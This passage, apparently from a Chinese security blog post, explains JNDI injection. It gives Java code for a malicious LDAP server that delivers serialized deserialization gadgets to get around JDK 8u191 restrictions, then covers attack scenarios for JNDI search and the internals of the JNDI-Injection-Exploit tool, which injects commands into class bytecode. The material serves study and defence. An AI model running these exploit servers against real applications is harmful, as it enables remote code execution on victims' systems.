&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8000/#EvilClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1389&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Ldap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;lt;codebase_url#classname&amp;gt; [&amp;lt;port&amp;gt;]&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//$NON-NLS-1$
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exit&lt;/span>&lt;span style="color:#f92672">(-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InMemoryDirectoryServerConfig&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InMemoryDirectoryServerConfig&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">LDAP_BASE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setListenerConfigs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InMemoryListenerConfig&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;listen&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#75715e">//$NON-NLS-1$
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">InetAddress&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#75715e">//$NON-NLS-1$
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServerSocketFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SocketFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">SSLSocketFactory&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">SSLSocketFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addInMemoryOperationInterceptor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OperationInterceptor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">])));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InMemoryDirectoryServer&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InMemoryDirectoryServer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Listening on 0.0.0.0:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//$NON-NLS-1$
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">startListening&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OperationInterceptor&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">InMemoryOperationInterceptor&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">codebase&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">OperationInterceptor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">cb&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">codebase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cb&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * {@inheritDoc}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">processSearchResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InMemoryInterceptedSearchResult&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">base&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getBaseDN&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sendResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sendResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InMemoryInterceptedSearchResult&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//jdk8u191之后
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javaClassName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//getObject获取Gadget
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javaSerializedData&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">serializeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getPayload&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sendSearchEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LDAPResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ResultCode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUCCESS&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>和低版本&lt;code>JDK&lt;/code>运行的&lt;code>Server&lt;/code>端代码差不多，就把&lt;code>sendResult&lt;/code>处的代码改成能触发反序列化漏洞的利用链就可以&lt;/p>
&lt;h4 id="refaddress">RefAddress&lt;/h4>
&lt;p>&lt;code>com.sun.jndi.ldap.Obj.java#decodeReference&lt;/code>函数在对普通的&lt;code>Reference&lt;/code>还原的基础上，还可以进一步对&lt;code>RefAddress&lt;/code>做还原处理，其中还原过程中，也调用了&lt;code>deserializeObject&lt;/code>函数，这意味着我们通过满足&lt;code>RefAddress&lt;/code>的方式，也可以达到上面第一种的效果。
需满足以下条件：
1.第一个字符为分隔符
2.第一个分隔符与第二个分隔符之间，表示&lt;code>Reference&lt;/code>的&lt;code>position&lt;/code>，为&lt;code>int&lt;/code>类型
3.第二个分隔符与第三个分隔符之间，表示&lt;code>type&lt;/code>，类型
4.第三个分隔符是双分隔符的形式，则进入反序列化的操作
5.序列化数据用&lt;code>base64&lt;/code>编码
&lt;code>payload&lt;/code>如下&lt;/p>
&lt;pre tabindex="0">&lt;code>//方式二
e.addAttribute(&amp;#34;javaClassName&amp;#34;, &amp;#34;foo&amp;#34;);
e.addAttribute(&amp;#34;javaReferenceAddress&amp;#34;,&amp;#34;$1$String$$&amp;#34;+new BASE64Encoder().encode(serializeObject(getPayload())));
e.addAttribute(&amp;#34;objectClass&amp;#34;, &amp;#34;javaNamingReference&amp;#34;); //$NON-NLS-1$
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png" alt="serialize4.png">&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png" alt="serialize5.png">&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png" alt="serialize6.png">&lt;/a>
触发点二只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。&lt;/p>
&lt;h2 id="jndi-search">JNDI search&lt;/h2>
&lt;p>lookup()方式是我们能控制ctx.lookup()参数进行对象的查找，LDAP服务器也是攻击者创建的。对于LDAP服务来说，大多数应用使用的是ctx.search()进行属性的查询，这时search会同时使用到几个参数，并且这些参数一般无法控制，但是会受到外部参数的影响，同时search()方式能被利用需要RETURN_OBJECT为true&lt;/p>
&lt;p>对于search方式的攻击需要有对目录属性修改的权限，因此有一些限制，在下面这些场景下可用：&lt;/p>
&lt;ul>
&lt;li>恶意员工：上面使用了几种利用都使用了modifyAttributes方法，但是需要有修改权限，如果员工具有修改权限那么就能像上面一样注入恶意的属性&lt;/li>
&lt;li>脆弱的LDAP服务器：如果LDAP服务器被入侵了，那么入侵LDAP服务器的攻击者能够进入LDAP服务器修改返回恶意的对象，对用的应用进行查询时就会受到攻击&lt;/li>
&lt;li>易受攻击的应用程序：利用易受攻击的一个应用，如果入侵了这个应用，且它具有对LDAP的写权限，那么利用它使注入LDAP属性，那么其他应用使用LDAP服务是也会遭到攻击&lt;/li>
&lt;li>用于访问LDAP目录的公开Web服务或API：很多现代LDAP服务器提供用于访问LDAP目录的各种Web API。可以是功能或模块，例如REST API，SOAP服务，DSML网关，甚至是单独的产品（Web应用程序）。其中许多API对用户都是透明的，并且仅根据LDAP服务器的访问控制列表（ACL）对它们进行授权。某些ACL允许用户修改其任何除黑名单外的属性&lt;/li>
&lt;li>中间人攻击：尽管当今大多数LDAP服务器使用TLS进行加密他们的通信后，但在网络上的攻击者仍然可能能够进行攻击并修改那些未加密的证书，或使用受感染的证书来修改属性&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;h3 id="已知漏洞">已知漏洞&lt;/h3>
&lt;ul>
&lt;li>Spring Security and LDAP projects&lt;/li>
&lt;li>FilterBasedLdapUserSearch.searchForUser()&lt;/li>
&lt;li>SpringSecurityLdapTemplate.searchForSingleEntry()&lt;/li>
&lt;li>SpringSecurityLdapTemplate.searchForSingleEntryInternal(){&lt;/li>
&lt;/ul>
&lt;h2 id="jndi-injection-exploit">JNDI-Injection-Exploit&lt;/h2>
&lt;p>常用的一个工具，提供class的远程加载功能，根据命令行输入动态生成class并放在服务器上&lt;/p>
&lt;h3 id="serverstart">ServerStart&lt;/h3>
&lt;p>作为程序的启动类，处理传入的参数和开启几个server的线程，并打印一些初始信息&lt;/p>
&lt;h3 id="jettyserver">JettyServer&lt;/h3>
&lt;p>将生成好的.class文件加入http server中让被外部访问&lt;/p>
&lt;p>DownloadServlet会对下载/访问情况作log记录，命令部分在&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">transformed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">insertCommad&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">in&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">insertCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassReader&lt;/span> &lt;span style="color:#111">cr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassWriter&lt;/span> &lt;span style="color:#111">cw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassWriter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">COMPUTE_FRAMES&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassVisitor&lt;/span> &lt;span style="color:#111">cv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cw&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cv&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cw&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里Class开头的三个类都属于ASM库，可以用来操作字节码&lt;/p>
&lt;ul>
&lt;li>ClassReader&lt;/li>
&lt;/ul>
&lt;p>将.class文件读入到ClassReader的字节数组中，accept方法接受一个ClassVisitor实现类，并按照顺序调用ClassVisitor中的方法&lt;/p>
&lt;ul>
&lt;li>ClassWriter&lt;/li>
&lt;/ul>
&lt;p>是ClassVisitor的子类，是和ClassReader对应的类，将修改后的类的字节码的内容以字节数组形式输出&lt;/p>
&lt;ul>
&lt;li>ClassVisitor&lt;/li>
&lt;/ul>
